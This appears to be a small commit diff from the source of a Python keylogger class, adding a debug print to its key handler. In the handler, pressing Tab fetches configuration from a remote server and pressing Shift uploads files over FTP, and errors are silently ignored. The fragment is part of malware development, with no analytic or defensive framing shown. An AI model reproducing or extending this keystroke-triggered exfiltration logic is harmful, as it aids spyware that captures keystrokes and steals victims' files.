@@ -20,6 +20,7 @@ class Keylogger(Thread):
             if key == Key.tab:
                 self.__communication.getConfigFromServer()
             elif key == Key.shift:
+                print('here!')
                 self.__communication.uploadFilesFTP()
         except Exception:
             pass
